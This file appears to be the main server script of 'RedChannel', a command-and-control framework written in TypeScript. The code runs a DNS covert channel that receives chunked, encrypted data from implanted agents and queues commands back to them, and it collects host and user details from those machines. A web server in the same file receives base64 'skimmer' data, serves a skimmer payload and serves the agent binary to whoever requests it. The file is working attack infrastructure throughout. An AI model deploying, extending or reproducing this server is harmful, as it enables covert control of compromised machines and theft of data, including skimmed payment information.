import RedChannel, { AgentChannel, AgentCommands } from "./lib/redchannel";
import RedChannelUI from "./lib/ui";
import { emsg } from "./utils/utils";
import chalk from "chalk";
import * as dnsd from "dnsd";
import * as util from "util";
import * as fs from "fs";
import * as crypto from "crypto";
import { Command } from "commander";

// move these to config?
const FLOOD_PROTECTION_TIMEOUT = 10;
const EXPECTED_DATA_SEGMENTS = 5;

const rc = new RedChannel(c2_message_handler);
const ui = new RedChannelUI(rc);
rc.log = ui;

const cli = new Command();
cli.version(rc.version, "-v, --version")
    .usage("[options]")
    .option("-c, --config <path/to/rc.conf>", "specify a redchannel config file", rc.config_file)
    .option("-p, --password <password>", "specify the password or set via env:RC_PASSWORD")
    .option("-c, --domain <domain>", "specify the c2 domain", "")
    .option("-B, --ip [ip]", "bind dns c2 to ip", "")
    .option("-P, --port [port]", "listen for dns on a specific port", "")
    .option("-W, --web-ip [ip]", "bind web server to ip", "")
    .option("-Y, --web-port [port]", "listen for web on a specific port", "")
    .option("-I, --agent-interval [ms]", "check in interval for the agent", "")
    .option("-R, --agent-resolver [ip:port]", "set the resolver to use for the agent", "")
    .option("-d, --debug", "enable debug", false)
    .parse(process.argv);

rc.config_file = cli.getOptionValue("config");

const banner = `
██████╗ ███████╗██████╗  ██████╗██╗  ██╗ █████╗ ███╗   ██╗███╗   ██╗███████╗██╗     
██╔══██╗██╔════╝██╔══██╗██╔════╝██║  ██║██╔══██╗████╗  ██║████╗  ██║██╔════╝██║     
██████╔╝█████╗  ██║  ██║██║     ███████║███████║██╔██╗ ██║██╔██╗ ██║█████╗  ██║     
██╔══██╗██╔══╝  ██║  ██║██║     ██╔══██║██╔══██║██║╚██╗██║██║╚██╗██║██╔══╝  ██║     
██║  ██║███████╗██████╔╝╚██████╗██║  ██║██║  ██║██║ ╚████║██║ ╚████║███████╗███████╗
╚═╝  ╚═╝╚══════╝╚═════╝  ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═══╝╚══════╝╚══════╝
`;
ui.msg(chalk.redBright(banner));

// read config file and merge with defaults to ensure properties exist
import merge from "lodash.merge";
try {
    const configData = JSON.parse(fs.readFileSync(rc.config_file).toString());
    rc.config = merge(rc.config, configData);
} catch (ex) {
    ui.error(`cannot read configuration file: ${rc.config_file}, err: ${emsg(ex)}`);
    process.exit(1);
}

const rcPassword = cli.getOptionValue("password");
// env password takes priority over commandline
if (process.env.RC_PASSWORD && process.env.RC_PASSWORD.length > 0) {
    ui.info("using master password from environment variable");
    rc.config.c2.plaintext_password = process.env.RC_PASSWORD;
    rc.master_password = crypto.createHash("md5").update(process.env.RC_PASSWORD).digest("hex");
} else if (rcPassword) {
    ui.info("using master password from cli");
    rc.config.c2.plaintext_password = rcPassword;
    rc.master_password = crypto.createHash("md5").update(rcPassword).digest("hex");
} else {
    ui.error("please specify a master c2 password via command-lie or environment variable, see '--help'");
    process.exit(1);
}

const rcDomain = cli.getOptionValue("domain") || rc.config.c2.domain;
if (!rcDomain) {
    rc.config.c2.domain = rcDomain;
    ui.error("please specify the c2 domain via cli or config file, see '--help'");
    process.exit(1);
}

/**
 optional arguments, default values set by commander ^
 */
if (cli.getOptionValue("ip") != "") rc.config.c2.dns_ip = cli.getOptionValue("ip");
if (cli.getOptionValue("port") != "") rc.config.c2.dns_port = cli.getOptionValue("port");
if (cli.getOptionValue("webIp") != "") rc.config.c2.web_ip = cli.getOptionValue("webIp");
if (cli.getOptionValue("webPort") != "") rc.config.c2.web_port = cli.getOptionValue("webPort");
if (cli.getOptionValue("agentInterval") != "") rc.config.implant.interval = cli.getOptionValue("agentInterval");
if (cli.getOptionValue("agentResolver") != "") rc.config.implant.resolver = cli.getOptionValue("agentResolver");

rc.config.debug = cli.getOptionValue("debug");
ui.debug(`loaded redchannel config: ${JSON.stringify(rc.config)}`);
/**
 UI
 */

/**
 Web channel
 */
const webServer = require("express")();

webServer.listen(rc.config.c2.web_port, rc.config.c2.web_ip, (err) => {
    if (err) return ui.error(`failed to start web server: ${err}`);
    ui.info(`c2-web listening on: ${rc.config.c2.web_ip}:${rc.config.c2.web_port}`);
});

/**
 Skimmer routes
 */

// incoming skimmer data
webServer.get(rc.config.skimmer.data_route, (request, response) => {
    ui.debug(`incoming skimmer raw data: ${JSON.stringify(request.query)}`);

    const decodedData = Buffer.from(request.query.id, "base64").toString();
    ui.success(`incoming skimmer data: \n ${decodedData}`);
    response.send("OK");
});

// server skimmer payload
webServer.get(rc.config.skimmer.payload_route, (request, response) => {
    let ip = request.headers["x-forwarded-for"] || request.socket.remoteAddress;
    ui.warn(`incoming request for skimmer payload from ${ip}`);
    response.send(rc.modules.skimmer.payload);
});

// agent binary payload
webServer.get(rc.config.c2.binary_route, (request, response) => {
    let ip = request.headers["x-forwarded-for"] || request.socket.remoteAddress;
    ui.warn(`incoming request for agent binary from ${ip}`);
    try {
        if (!fs.existsSync(rc.config.implant.output_file)) throw new Error(`agent binary not found on disk, did you generate an implant?`);
        response.sendFile(rc.config.implant.output_file);
        ui.warn(`agent binary sent to ${ip}`);
    } catch (ex) {
        ui.error(`agent binary not sent to ${ip}, err: ${emsg(ex)}`);
        response.status(404).send("404 File Not Found");
    }
});

/**
 DNS channel
 */
const dnsServer = dnsd.createServer(c2_message_handler);
// prettier-ignore
dnsServer
    .zone(
        rc.config.c2.domain,
        "ns1." + rc.config.c2.domain,
        "root@" + rc.config.c2.domain,
        "now",
        "2h",
        "30m",
        "2w",
        "10m"
    )
    .listen(rc.config.c2.dns_port, rc.config.c2.dns_ip);

ui.info(`c2-dns listening on: ${rc.config.c2.dns_ip}:${rc.config.c2.dns_port}`);

/**
 * Start the proxy loop if it is enabled;
 */
if (rc.config.proxy.enabled) {
    ui.info(`starting proxy checkin at interval: ${rc.config.proxy.interval}ms`);
    rc.proxy_fetch_loop();
}

/**
 req: {
      connection: {
          remoteAddress: '127.0.0.1',
          type: 'AAAA'
      }
 }
 res: {
      question[0]: {
          type: 'AAAA',
          name: 'dns.query.tld'
      },
      answer: [],
      end: function(){}
 }
 */
function c2_message_handler(req, res) {
    var question = res.question[0];
    var hostname = question.name;
    var ttl = 300; // Math.floor(Math.random() 3600)
    let channel = question.type === "PROXY" ? AgentChannel.PROXY : AgentChannel.DNS;

    if (typeof rc.config.static_dns[hostname] != "undefined") {
        ui.info(`static_dns: responding to request for host: '${hostname}' with ip '${rc.config.static_dns[hostname]}'`);
        res.answer.push({
            name: hostname,
            type: "A",
            data: rc.config.static_dns[hostname],
            ttl: ttl,
        });
        return res.end();
    }

    if (!hostname.endsWith(rc.config.c2.domain)) {
        ui.debug(`unknown c2 domain, ignoring query for: ${hostname}`);
        return res.end();
    }
    ui.debug(util.format("query: %s:%s %s %s", req.connection.remoteAddress, req.connection.type, question.type, question.name));

    if (question.type !== "AAAA" && question.type !== "PROXY") {
        ui.debug(util.format("ignoring non-AAAA/non-PROXY query %s:%s %s %s", req.connection.remoteAddress, req.connection.type, question.type, question.name));
        return res.end();
    }

    const segments = hostname.slice(0, hostname.length - rc.config.c2.domain.length).split(".");
    if (segments.length < EXPECTED_DATA_SEGMENTS) {
        ui.error(util.format("invalid message, not enough data segments (%d, expected %d): %s", segments.length, EXPECTED_DATA_SEGMENTS, hostname));

        return res.end();
    }

    // used to prevent flooding
    const rand_id = segments[0];

    const agent_id = segments[1];
    if (rc.agents[agent_id] == null) {
        rc.init_agent(agent_id, channel);
        ui.warn(`first ping from agent ${chalk.blue(agent_id)}, src: ${req.connection.remoteAddress}, channel: ${rc.agents[agent_id].channel}`);

        if (!rc.crypto.privateKey) rc.crypto.generate_keys();

        ui.warn(`keyx started with agent ${chalk.blue(agent_id)}`);
        rc.command_keyx(agent_id);
    }
    rc.agents[agent_id].lastseen = Math.floor(Date.now() / 1000);
    rc.agents[agent_id].ip = req.connection.remoteAddress;

    let command = 0;
    try {
        command = parseInt(segments[2].slice(0, 2), 16);
    } catch (ex) {
        ui.error(`failed to parse command: ${emsg(ex)}`);

        return res.end();
    }

    // no need to check the incoming data, just send a queued up msg
    if (command == AgentCommands.AGENT_CHECKIN) {
        if (channel !== rc.agents[agent_id].channel) {
            ui.warn(`agent ${chalk.blue(agent_id)} switching channel from ${rc.agents[agent_id].channel} to ${channel}`);
            rc.agents[agent_id].channel = channel;
        }

        if (rc.agents[agent_id]?.sendq?.length == 0) {
            // 03 means no data to send
            ui.debug(`agent ${agent_id} checking in, no data to send`);
            const noDataStatus = rc.make_ip_string("03");
            res.answer.push({
                name: hostname,
                type: "AAAA",
                data: noDataStatus,
                ttl: ttl,
            });

            return res.end();
        }

        // we have already responded to this agent and rand_id combination
        // reset the flood protection timeout
        if (rc.agents[agent_id].ignore[rand_id]) {
            clearTimeout(rc.agents[agent_id].ignore[rand_id]);
            rc.agents[agent_id].ignore[rand_id] = setTimeout(function () {
                delete rc.agents[agent_id].ignore[rand_id];
            }, FLOOD_PROTECTION_TIMEOUT);

            ui.warn(`ignoring flood from agent: ${chalk.blue(agent_id)}, rid: ${rand_id}, command: ${command}`);
            return res.end();
        }

        ui.debug(`agent ${agent_id} checking in, sending next queued command`);
        const records = rc.agents[agent_id]?.sendq?.shift();
        if (records) {
            records.forEach((record) => {
                res.answer.push({
                    name: hostname,
                    type: "AAAA",
                    data: record,
                    ttl: ttl,
                });
            });
        }

        // flood protection, if the agent dns resolver retries a query, data can be lost
        rc.agents[agent_id].ignore[rand_id] = setTimeout(function () {
            delete rc.agents[agent_id].ignore[rand_id];
        }, FLOOD_PROTECTION_TIMEOUT);

        return res.end();
    }

    var current_chunk = 0;
    var total_chunks = 0;
    try {
        current_chunk = parseInt(segments[2].slice(2, 4), 16);
        total_chunks = parseInt(segments[2].slice(4, 6), 16);
    } catch (ex) {
        return ui.error(`message: invalid chunk numbers, current: ${current_chunk}, total: ${total_chunks}`);
    }

    var data_id = segments[3];
    if (data_id.length < 2) return ui.error(`message: invalid data id: ${data_id}`);

    var chunk = segments[4];
    if (chunk.length < 2) return ui.error(`message: invalid chunk: ${chunk}`);

    if (typeof rc.agents[agent_id].recvq[command] == "undefined") {
        rc.agents[agent_id].recvq[command] = {};
    }
    if (typeof rc.agents[agent_id].recvq[command][data_id] == "undefined") {
        rc.agents[agent_id].recvq[command][data_id] = {
            chunks: [],
            data: "",
        };
    }

    rc.agents[agent_id].recvq[command][data_id].chunks[current_chunk] = chunk;
    if (rc.count_data_chunks(rc.agents[agent_id].recvq[command][data_id].chunks) == total_chunks) {
        const dataChunks = rc.agents[agent_id].recvq[command][data_id].chunks.join("");
        delete rc.agents[agent_id].recvq[command][data_id];

        // process data, send back status (0f = failed, 02 = success)
        const processStatus = process_dns_data(agent_id, command, dataChunks);
        if (processStatus) {
            res.answer.push({
                name: hostname,
                type: "AAAA",
                data: processStatus,
                ttl: ttl,
            });
        }

        return res.end();
    }

    // last byte 01 indicates more data is expected
    const moreData = rc.make_ip_string("01");
    res.answer.push({
        name: hostname,
        type: "AAAA",
        data: moreData,
        ttl: ttl,
    });

    /*if (question.type == 'CNAME') {
        res.answer.push({ name: hostname, type: 'CNAME', data: "x.domain.tld", 'ttl': ttl })
    }
    if (question.type == 'A') {
        res.answer.push({ name: hostname, type: 'A', data: "1.1.1." + length, 'ttl': ttl })
    }*/
    return res.end();
}

/**
 Process decoded DNS data and respond
 @param {*} agent_id
 @param {*} command
 @param {*} data
 @returns Object immediate response over dns (success, more data, error)
 */
function process_dns_data(agent_id, command, data) {
    // default success status, 02 means data was received and processed successfully
    const returnStatus = rc.make_ip_string("02");
    let plaintext: string = "";
    switch (command) {
        case AgentCommands.AGENT_KEYX:
            if (!rc.agents[agent_id].allow_keyx) {
                ui.error(`incoming keyx from ${chalk.blue(agent_id)} not allowed, initiate keyx first`);
                break;
            }

            if (!rc.crypto.privateKey) rc.crypto.generate_keys();

            const agentPubkey = Buffer.from(data, "hex");
            try {
                rc.agents[agent_id].keyx = rc.crypto.import_uncompressed_pubkey(agentPubkey);
            } catch (ex) {
                ui.error(`cannot import key for ${chalk.blue(agent_id)}: ${emsg(ex)}`);
                break;
            }
            ui.success(`agent(${chalk.blue(agent_id)}) keyx: ${rc.agents[agent_id].keyx.asPublicECKey().toString("spki")}`);

            try {
                rc.agents[agent_id].secret = rc.crypto.derive_secret(rc.agents[agent_id].keyx, rc.master_password);
            } catch (ex) {
                ui.error(`cannot derive secret for ${chalk.blue(agent_id)}: ${emsg(ex)}`);
                break;
            }
            ui.success(`agent(${chalk.blue(agent_id)}) secret: ${rc.agents[agent_id].secret?.toString("hex")}`);

            // if there are no more queued up keyx's, ignore further keyxs from agent
            if (!rc.is_command_in_sendq(agent_id, AgentCommands.AGENT_KEYX)) rc.agents[agent_id].allow_keyx = false;
            break;
        case AgentCommands.AGENT_MSG:
            plaintext = "";
            try {
                plaintext = decrypt_dns_message(agent_id, data);
            } catch (ex) {
                ui.error(`cannot decrypt message from ${chalk.blue(agent_id)}: ${emsg(ex)}`);
                break;
            }
            ui.success(`agent(${chalk.blue(agent_id)}) output>\n ${plaintext.toString()}`);
            break;
        case AgentCommands.AGENT_SYSINFO:
            plaintext = "";
            try {
                plaintext = decrypt_dns_message(agent_id, data);
            } catch (ex) {
                ui.error(`cannot decrypt message from ${chalk.blue(agent_id)}: ${emsg(ex)}`);
                break;
            }

            const sysInfo = plaintext.toString().split(";");
            const userInfo = sysInfo[2].split(":");
            const displayRows = [
                [chalk.yellowBright("hostname"), chalk.gray(sysInfo[0])],
                [chalk.yellowBright("ips"), chalk.gray(sysInfo[1])],
                [chalk.yellowBright("user"), chalk.gray(userInfo[0])],
                [chalk.yellowBright("uid"), chalk.gray(userInfo[1])],
                [chalk.yellowBright("gid"), chalk.gray(userInfo[2])],
            ];

            ui.success(`agent(${chalk.blue(agent_id)}) sysinfo>`);
            ui.display_table([], displayRows);
            break;
    }
    return returnStatus;
}

function decrypt_dns_message(agentId, data) {
    if (!agentId) throw new Error("invalid agent id");
    if (!data) throw new Error("invalid data");
    if (!rc.agents[agentId].keyx) throw new Error("missing keyx");

    const buffer = Buffer.from(data, "hex");
    const iv = buffer.slice(0, rc.crypto.BLOCK_LENGTH);
    const ciphertext = buffer.slice(rc.crypto.BLOCK_LENGTH);

    // may throw errors
    const plaintext = rc.crypto.aes_decrypt(ciphertext, rc.agents[agentId].secret, iv);
    return plaintext.toString();
}
